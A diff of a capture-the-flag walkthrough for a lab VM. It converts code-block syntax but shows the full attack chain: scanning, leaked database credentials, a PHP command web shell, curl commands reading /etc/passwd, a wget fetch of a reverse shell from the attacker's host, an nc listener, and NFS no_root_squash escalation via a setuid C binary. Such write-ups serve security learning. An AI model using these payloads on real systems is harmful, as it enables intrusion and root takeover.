@@ -14,7 +14,7 @@ Start out by hitting: http://10.37.129.9/ looks about the same as the previous t
 
 ### netdiscover
 
-{% highlight bash %}
+```bash
 sudo netdiscover -r 10.37.129.0/24
 Currently scanning: Finished!   |   Screen View: Unique Hosts
 
@@ -25,7 +25,7 @@ IP            At MAC Address     Count     Len  MAC Vendor / Hostname
 10.37.129.1     00:1c:42:00:00:19      1      42  Parallels, Inc.
 10.37.129.2     00:1c:42:00:00:09      1      42  Parallels, Inc.
 10.37.129.9     00:1c:42:1e:25:17      1      60  Parallels, Inc.
-{% endhighlight %}
+```
 
 ### nmap
 
@@ -87,7 +87,7 @@ Nmap done: 1 IP address (1 host up) scanned in 24.49 seconds
 
 ### nikto
 
-{% highlight bash %}
+```bash
 nikto -host 10.37.129.9 -C all
 - Nikto v2.1.6
 ---------------------------------------------------------------------------
@@ -148,9 +148,9 @@ nikto -host 10.37.129.9 -C all
 + End Time:           2017-08-07 20:44:44 (GMT-6) (119 seconds)
 ---------------------------------------------------------------------------
 + 1 host(s) tested
-{% endhighlight %}
+```
 
-{% highlight bash %}
+```bash
 dirb http://10.37.129.9 /usr/share/wordlists/dirb/big.txt
 
 -----------------
@@ -561,7 +561,7 @@ GENERATED WORDS: 20458
 -----------------
 END_TIME: Mon Aug  7 21:08:10 2017
 DOWNLOADED: 1575266 - FOUND: 12
-{% endhighlight %}
+```
 
 ## Gaining Access
 
@@ -569,13 +569,13 @@ http://10.37.129.9/admin/
 
 Tried root/password and root/root no luck, moving on.
 
-{% highlight html %}
+```html
 <!-- This is a backup taken from the backups/-->
-{% endhighlight %}
+```
 
 http://10.37.129.9/backups/
 
-{% highlight html %}
+```html
 <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
 <html>
  <head>
@@ -593,9 +593,9 @@ http://10.37.129.9/backups/
 </table>
 <address>Apache/2.4.18 (Ubuntu) Server at 10.37.129.9 Port 80</address>
 </body></html>
-{% endhighlight %}
+```
 
-{% highlight bash %}
+```bash
 wget http://10.37.129.9/backups/SimplePHPQuiz-Backupz.tar.gz
 tar -zxvf SimplePHPQuiz-Backupz.tar.gz
 cd SimplePHPQuiz
@@ -605,7 +605,7 @@ includes/db_conn.php:@ $dbc = new mysqli(DB_HOST, DB_USER, DB_PASSWORD, DB_NAME)
 grep -ir 'db_user' *
 includes/db_conn.php:DEFINE ('DB_USER', 'dbuser');
 includes/db_conn.php:@ $dbc = new mysqli(DB_HOST, DB_USER, DB_PASSWORD, DB_NAME);
-{% endhighlight %}
+```
 
 http://10.37.129.9/admin/
 
@@ -623,9 +623,9 @@ Now add my own admin user, admin:dr0wss4p!
 
 Poke around a bit to try and upload a file, then looking through plugins I see the option to enable elFinder, turn it on and create a shell.php file, then edit the file in elFinder:
 
-{% highlight php %}
+```php
 <?php system($_GET["cmd"]); ?>
-{% endhighlight %}
+```
 
 This will serve as a starting point to getting a real reverse shell going:
 
@@ -633,7 +633,7 @@ curl -v http://10.37.129.9/zenphoto/uploaded/shell.php?cmd=cat%20/etc/passwd
 
 To test it out:
 
-{% highlight bash %}
+```bash
 curl -v http://10.37.129.9/zenphoto/uploaded/shell.php?cmd=cat%20/etc/passwd
 *   Trying 10.37.129.9...
 * TCP_NODELAY set
@@ -692,11 +692,11 @@ _apt:x:119:65534::/nonexistent:/bin/false
 dnsmasq:x:120:65534:dnsmasq,,,:/var/lib/misc:/bin/false
 * Curl_http_done: called premature == 0
 * Connection #0 to host 10.37.129.9 left intact
-{% endhighlight %}
+```
 
 Now to get a better shell:
 
-{% highlight bash %}
+```bash
 screen python -m SimpleHTTPServer
 curl -v http://10.37.129.9/zenphoto/uploaded/shell.php?cmd=wget%20http://10.37.129.5:8000/php_reverse_webshell.php
 sudo nc sudo nc -vnlp 443
@@ -713,7 +713,7 @@ cd /
 locate flag.txt
 cat /var/www/flag.txt
 868c889965b7ada547fae81f922e45c4
-{% endhighlight %}
+```
 
 There's the first flag
 
@@ -723,15 +723,15 @@ There's the first flag
 
 Using g0mi1k's privilege escalation writeup and running various commands I was able to find nfs running as root.  After some researching on interacting with this on the cli I found this command: showmount
 
-{% highlight bash %}
+```bash
 showmount -e 10.37.129.9
 Export list for 10.37.129.9:
 /tmp *
-{% endhighlight %}
+```
 
 This lists out all the exports mount points from nfs.  The exported mount point is: /tmp so lets mount it!
 
-{% highlight bash %}
+```bash
 
 mkdir /tmp/vulnhub
 cd /tmp/vulnhub
@@ -751,11 +751,11 @@ drwxrwxrwt  9 root root 4.0K Aug  9 14:45 vulnhub
 drwxr-xr-x 23 root root 4.0K Aug  7 20:26 ..
 
 touch shell.c
-{% endhighlight %}
+```
 
 Then on our web shell:
 
-{% highlight bash %}
+```bash
 
 ls -lath /tmp
 total 48K
@@ -783,7 +783,7 @@ cat /etc/exports
 #
 /tmp *(rw,no_root_squash)
 
-{% endhighlight %}
+```
 
 After some research the important part: (rw, no_root_squash) essentially tells the nfs daemon to create files as the user running the service and leave them as is.  When this setting is not present (default in most cases) nfsnobody is the user who owns files created via nfs this is to prevent programs like the one found below from being uploaded and used to escalate privilege.  This means chown chmod are open game
 
@@ -791,7 +791,7 @@ After some research the important part: (rw, no_root_squash) essentially tells t
 
 Once I found that nfs was running as root I started looking up how to exploit it and an example for this VM, credits to g0blin research (https://g0blin.co.uk/orcus-vulnhub-writeup/#elevation) was available to learn from:
 
-{% highlight c %}
+```c
 #include <unistd.h>
 
 main(int argc, char ** argv, char ** envp)
@@ -801,11 +801,11 @@ main(int argc, char ** argv, char ** envp)
     system("/bin/bash", argv, envp);
     return 0;
 }
-{% endhighlight %}
+```
 
 Then on through our web shell:
 
-{% highlight bash %}
+```bash
 cd /tmp
 gcc shell.c -o shell
 shell.c:3:1: warning: return type defaults to 'int' [-Wimplicit-int]
@@ -815,38 +815,38 @@ shell.c: In function 'main':
 shell.c:7:2: warning: implicit declaration of function 'system' [-Wimplicit-function-declaration]
  system("/bin/bash", argv, envp);
  ^
-{% endhighlight %}
+```
 
 Then set the executable up on our host:
 
-{% highlight bash %}
+```bash
 chown root:root shell
 chmod +s shell
-{% endhighlight %}
+```
 
 Then run the exploit:
 
-{% highlight bash %}
+```bash
 ./shell
 whoami
 root
-{% endhighlight %}
+```
 
 And for the root flag:
 
-{% highlight bash %}
+```bash
 cd /
 locate flag.txt
 cat /root/flag.txt
 807307b49314f822985d0410de7d8bfe
-{% endhighlight %}
+```
 
 
 ## Flag 3
 
 Now that I had root (and it's flag) time to start looking around more...
 
-{% highlight bash %}
+```bash
 cat /etc/passwd
 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
@@ -930,11 +930,11 @@ uuidd:!:16273:0:99999:7:::
 lxd:*:17102:0:99999:7:::
 _apt:*:17102:0:99999:7:::
 dnsmasq:*:17102:0:99999:7:::
-{% endhighlight %}
+```
 
 Upon initial inspection of these files I didn't see anything that jumped out at me.  Then after a lot more enumeration I broke down and wanted to see how a more experienced tester was able to progress farther.  The user kippo is one that a known honeypot might run as.  Upon running:
 
-{% highlight bash %}
+```bash
 whereis kippo
 /etc/kippo
 cd /etc/kippo
@@ -1137,7 +1137,7 @@ txtcmds/usr/sbin/vipw:vipw: /etc/passwd is unchanged
 utils/passdb.py:        print 'Usage: %s <pass.db> <add|remove|list> [password]' % \
 utils/passdb.py:        for password in db.keys():
 utils/passdb.py:            print password
-{% endhighlight %}
+```
 
 The second line returned: data/userdb.txt:fakuser:1:TH!SP4SSW0RDIS4Fl4G!
 
